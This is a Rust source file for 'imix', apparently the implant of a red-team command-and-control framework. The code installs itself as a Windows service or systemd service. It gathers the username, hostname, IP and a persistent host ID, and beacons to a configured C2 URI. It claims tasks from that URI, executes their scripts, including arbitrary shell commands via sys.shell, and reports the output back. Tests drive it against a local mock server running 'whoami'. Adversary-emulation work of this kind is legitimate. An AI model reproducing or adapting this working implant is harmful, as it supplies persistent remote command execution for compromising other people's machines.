use std::sync::mpsc::{channel, Sender, Receiver};
use std::thread;
use std::{collections::HashMap, fs};
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::time::Instant;
use chrono::{Utc, DateTime};
use clap::{Command, arg};
use anyhow::{Result, Error};
use tokio::task::{self, JoinHandle};
use tokio::time::Duration;
use imix::graphql::{GraphQLTask, self};
use eldritch::{eldritch_run,EldritchPrintHandler};
use uuid::Uuid;
use sys_info::{os_release,linux_os_release};

pub struct ExecTask {
    future_join_handle: JoinHandle<Result<(), Error>>,
    start_time: DateTime<Utc>,
    graphql_task: GraphQLTask,
    print_reciever: Receiver<String>,
}

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;

    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }

    unimplemented!("The current OS/Service Manager is not supported")
}
async fn handle_exec_tome(task: GraphQLTask, print_channel_sender: Sender<String>) -> Result<(String,String)> {
    // TODO: Download auxillary files from CDN

    // Read a tome script
    let task_job = match task.job {
        Some(job) => job,
        None => return Ok(("".to_string(), format!("No job associated for task ID: {}", task.id))),
    };

    let tome_name = task_job.tome.name;
    let tome_contents = task_job.tome.eldritch;

    let print_handler = EldritchPrintHandler{ sender: print_channel_sender };

    println!("{:?}",task_job.parameters);
    // Execute a tome script
    let res =  match thread::spawn(move || { eldritch_run(tome_name, tome_contents, task_job.parameters, &print_handler) }).join() {
        Ok(local_thread_res) => local_thread_res,
        Err(_) => todo!(),
    };
    
    match res {
        Ok(tome_output) => Ok((tome_output, "".to_string())),
        Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
    }
}

async fn handle_exec_timeout_and_response(task: graphql::GraphQLTask, print_channel_sender: Sender<String>) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome(task.clone(), print_channel_sender.clone());

    // Execute that future with a timeout defined by the timeout argument.
    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => {
            match res {
                Ok(tome_result) => tome_result,
                Err(tome_error) => ("".to_string(), tome_error.to_string()),
            }
        },
        Err(timer_elapsed) => ("".to_string(), format!("Time elapsed task {} has been running for {} seconds", task.id, timer_elapsed.to_string())),
    };

    print_channel_sender.clone().send(format!("---[RESULT]----\n{}\n---------",tome_result.0))?;
    print_channel_sender.clone().send(format!("---[ERROR]----\n{}\n--------",tome_result.1))?;
    Ok(())
}

fn get_principal() -> Result<String> {
    Ok(whoami::username())
}

fn get_hostname() -> Result<String> {
    Ok(whoami::hostname())
}

fn get_session_id() -> Result<String> {
    let session_id = Uuid::new_v4();
    Ok(session_id.to_string())
}

fn get_host_id(host_id_file_path: String) -> Result<String> {
    let mut host_id = Uuid::new_v4().to_string();
    let host_id_file = Path::new(&host_id_file_path);
    if host_id_file.exists() {
        host_id = match fs::read_to_string(host_id_file) {
            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
            Err(_) => host_id,
        };
    } else {
        let mut host_id_file_obj = match File::create(host_id_file) {
            Ok(tmp_file_obj) => tmp_file_obj,
            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
        };
        match host_id_file_obj.write_all(host_id.as_bytes()) {
            Ok(_) => {}, // Don't care if write fails or not going to to send our generated one.
            Err(_) => {},
        }
    }
    Ok(host_id)
}

fn get_primary_ip() -> Result<String> {
    let res = match default_net::get_default_interface() {
        Ok(default_interface) => {
            if default_interface.ipv4.len() > 0 {
                default_interface.ipv4[0].addr.to_string()
            }else{
                "DANGER-UNKNOWN".to_string()
            }
        },
        Err(e) => {
            println!("Error getting primary ip address:\n{e}");
            "DANGER-UNKNOWN".to_string()
        },
    };
    Ok(res)
}

fn get_host_platform() -> Result<String> {
    if cfg!(target_os = "linux") {
        return Ok("Linux".to_string());
    } else if cfg!(target_os = "windows") {
        return Ok("Windows".to_string());
    } else if cfg!(target_os = "macos") {
        return Ok("MacOS".to_string());
    } else {
        return Ok("Unknown".to_string());
    }
}

fn get_os_pretty_name() -> Result<String> {
    if cfg!(target_os = "linux") {
        let linux_rel = linux_os_release()?;
        let pretty_name = match linux_rel.pretty_name {
            Some(local_pretty_name) => local_pretty_name,
            None => "UNKNOWN-Linux".to_string(),
        };
        return Ok(format!("{}",pretty_name));
    } else if cfg!(target_os = "windows") || cfg!(target_os = "macos") {
        return Ok(os_release()?);
    } else {
        return Ok("UNKNOWN".to_string());
    }
}

// Async handler for port scanning.
async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
    let debug = true;
    let version_string = "v0.1.0";
    let config_file = File::open(config_path)?;
    let imix_config: imix::Config = serde_json::from_reader(config_file)?;

    // This hashmap tracks all jobs by their ID (key) and a tuple value: (future, channel_reciever)
    let mut all_exec_futures: HashMap<String,  ExecTask> = HashMap::new();

    let principal = match get_principal() {
        Ok(username) => username,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get process username\n{}", error));
            }
            "UNKNOWN".to_string()
        },
    };

    let hostname = match get_hostname() {
        Ok(tmp_hostname) => tmp_hostname,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get system hostname\n{}", error));
            }
            "UNKNOWN".to_string()
        },
    };

    let session_id = match get_session_id() {
        Ok(tmp_session_id) => tmp_session_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get a random session id\n{}", error));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let host_platform = match get_host_platform() {
        Ok(tmp_host_platform) => tmp_host_platform,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get host platform id\n{}", error));
            }
            "Unknown".to_string()
        },
    };

    let host_id = match get_host_id("/etc/system-id".to_string()) {
        Ok(tmp_host_id) => tmp_host_id,
        Err(error) => {
            if debug {
                return Err(anyhow::anyhow!("Unable to get or create a host id\n{}", error));
            }
            "DANGER-UNKNOWN".to_string()
        },
    };

    let claim_tasks_input = graphql::GraphQLClaimTasksInput {
        principal: principal,
        hostname: hostname,
        session_identifier: session_id,
        host_identifier: host_id,
        agent_identifier: format!("{}-{}","imix",version_string),
        host_platform: host_platform,
    };

    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();
        if debug { println!("Get new tasks"); }
        // 1. Pull down new tasks
        // 1a) calculate callback uri
        let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();

        // 1b) Collect new tasks
        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone(), claim_tasks_input.clone()).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                let empty_vec = vec![];
                empty_vec
            },
        };

        if debug { println!("Starting {} new tasks", new_tasks.len()); }
        // 2. Start new tasks
        for task in new_tasks {
            if debug { println!("Launching:\n{:?}", task.clone().job.unwrap().tome.eldritch); }

            let (sender, receiver) = channel::<String>();
            let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
            match all_exec_futures.insert(task.clone().id, ExecTask{
                future_join_handle: task::spawn(exec_with_timeout), 
                start_time: Utc::now(), 
                graphql_task: task.clone(), 
                print_reciever: receiver,
            }) {
                Some(_old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n");
                    }
                },
                None => {}, // Task queued successfully
            }
        }

        if debug { println!("Sleeping"); }
        // 3. Sleep till callback time
        //                                  time_to_wait          -         time_elapsed
        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
        tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await;


        // :clap: :clap: make new map!
        let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();

        if debug { println!("Checking status"); }
        // Check status & send response
        for exec_future in all_exec_futures.into_iter() {
            if debug {
                println!("{}: {:?}", exec_future.0, exec_future.1.future_join_handle.is_finished());
            }
            let mut res: Vec<String> = vec![];
            loop {
                if debug { println!("Reciveing output"); }
                let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
                    Ok(local_res_string) => local_res_string,
                    Err(local_err) => {
                        match local_err.to_string().as_str() {
                            "channel is empty and sending half is closed" => { break; },
                            _ => eprint!("Error: {}", local_err),
                        }
                        break;
                    },
                };
                // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
                res.push(new_res_line);
                // Send task response
            }
            let task_response = match exec_future.1.future_join_handle.is_finished() {
                true => {
                    graphql::GraphQLSubmitTaskResultInput {
                        task_id: exec_future.1.graphql_task.id.clone(),
                        exec_started_at: exec_future.1.start_time,
                        exec_finished_at: Some(Utc::now()),
                        output: res.join("\n"),
                        error: "".to_string(),
                    }
                },
                false => {
                    graphql::GraphQLSubmitTaskResultInput {
                        task_id: exec_future.1.graphql_task.id.clone(),
                        exec_started_at: exec_future.1.start_time,
                        exec_finished_at: None,
                        output: res.join("\n"),
                        error: "".to_string(),
                    }
                },
            };
            if debug {
                println!("{}", task_response.output);
            }
            let submit_task_result = graphql::gql_post_task_result(cur_callback_uri.clone(), task_response).await;
            let _ = match submit_task_result {
                Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
                Err(error) => Err(error),
            };

                // Only re-insert the runnine exec futures
            if !exec_future.1.future_join_handle.is_finished() {
                running_exec_futures.insert(exec_future.0, exec_future.1);
            }
        }

        // change the reference! This is insane but okay.
        all_exec_futures = running_exec_futures;
        if run_once { return Ok(()); };
    }
}


pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();


    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();


    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            match runtime.block_on(
                install(String::from(config_path))
            ) {
                Ok(_response) => {},
                Err(_error) => {},
            }
        },
        _ => {},
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string(), false)) {
            Ok(_) => {},
            Err(error) => println!("Imix mail_loop exited unexpectedly with config: {}\n{}", config_path.to_string(), error),
        }
    }
    Ok(())
}



#[cfg(test)]
mod tests {
    use httptest::{Server, Expectation, matchers::{request}, responders::status_code, all_of};
    use httptest::matchers::matches;
    use imix::{graphql::{GraphQLJob, GraphQLTome}};
    use tempfile::NamedTempFile;
    use super::*;

    #[test]
    fn imix_test_default_ip(){
        let primary_ip_address = match get_primary_ip() {
            Ok(local_primary_ip) => local_primary_ip,
            Err(local_error) => {
                println!("An error occured during testing default_ip:{local_error}");
                assert_eq!(false,true);
                "DANGER-UNKNOWN".to_string()
            },
        };
        assert!((primary_ip_address != "DANGER-UNKNOWN".to_string()))
    }
    
    #[test]
    fn imix_test_get_os_pretty_name() { 
        let res = get_os_pretty_name().unwrap();
        println!("{res}");
        assert!(!res.contains("UNKNOWN"));
    }

    #[test]
    fn imix_handle_exec_tome() {
        let test_tome_input = GraphQLTask{
            id: "17179869185".to_string(),
            job: Some(GraphQLJob {
                id: "4294967297".to_string(),
                name: "Test Exec".to_string(),
                tome: GraphQLTome {
                    id: "21474836482".to_string(),
                    name: "Shell execute".to_string(),
                    description: "Execute a command in the default system shell".to_string(),
                    eldritch: r#"
print("custom_print_handler_test")
sys.shell(input_params["cmd"])["stdout"]
"#.to_string(),
                    files: [].to_vec(),
                    param_defs: Some(r#"{"params":[{"name":"cmd","type":"string"}]}"#.to_string()),
                },
                parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
                bundle: None,
            }),
        };


        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();

        let (sender, receiver) = channel::<String>();

        // Define a future for our execution task
        let exec_future = handle_exec_tome(test_tome_input, sender.clone());
        let result = runtime.block_on(exec_future).unwrap();
    
        let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
        assert_eq!(stdout, "custom_print_handler_test".to_string());

        println!("{:?}", result.clone());
        let mut bool_res = false;

        if cfg!(target_os = "linux") ||
        cfg!(target_os = "ios") ||
        cfg!(target_os = "android") ||
        cfg!(target_os = "freebsd") ||
        cfg!(target_os = "openbsd") ||
        cfg!(target_os = "netbsd") ||
        cfg!(target_os = "macos") {
            bool_res = result.0 == "runner\n" || result.0 == "root\n";
        }
        else if cfg!(target_os = "windows") {
            bool_res =  result.0.contains("runneradmin") || result.0.contains("Administrator");
        }

        assert_eq!(bool_res, true);

    }

    #[test]
    fn imix_test_main_loop_run_once() -> Result<()> {

        // Response expectations are poped in reverse order.
        let server = Server::run();
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*ImixPostResult.*main_loop_test_success.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(r#"{"data":{"submitTaskResult":{"id":"17179869185"}}}"#)),
        );
        server.expect(
            Expectation::matching(all_of![
                request::method_path("POST", "/graphql"),
                request::body(matches(".*claimTasks.*"))
            ])
            .times(1)
            .respond_with(status_code(200)
            .body(r#"{"data":{"claimTasks":[{"id":"17179869185","job":{"id":"4294967297","name":"Exec stuff","parameters":"{\"cmd\":\"echo main_loop_test_success\"}","tome":{"id":"21474836482","name":"sys exec","description":"Execute system things.","paramDefs":"{\"paramDefs\":[{\"name\":\"cmd\",\"type\":\"string\"}]}","eldritch":"print(sys.shell(input_params[\"cmd\"]))","files":[]},"bundle":null}}]}}"#)),
        );

        let tmp_file_new = NamedTempFile::new()?;
        let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
        let url = server.url("/graphql").to_string();
        let _ = std::fs::write(path_new.clone(),format!(r#"{{
    "service_configs": [],
    "target_forward_connect_ip": "127.0.0.1",
    "target_name": "test1234",
    "callback_config": {{
        "interval": 8,
        "jitter": 1,
        "timeout": 4,
        "c2_configs": [
        {{
            "priority": 1,
            "uri": "{url}"
        }}
        ]
    }}
}}"#));

        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();

        // let (sender, receiver) = channel::<String>();

        // // Define a future for our execution task
        // let exec_future = handle_exec_tome(test_tome_input, sender.clone())
        let exec_future = main_loop(path_new, true);
        let _result = runtime.block_on(exec_future).unwrap();
    
        assert!(true);
        Ok(())
    }
}

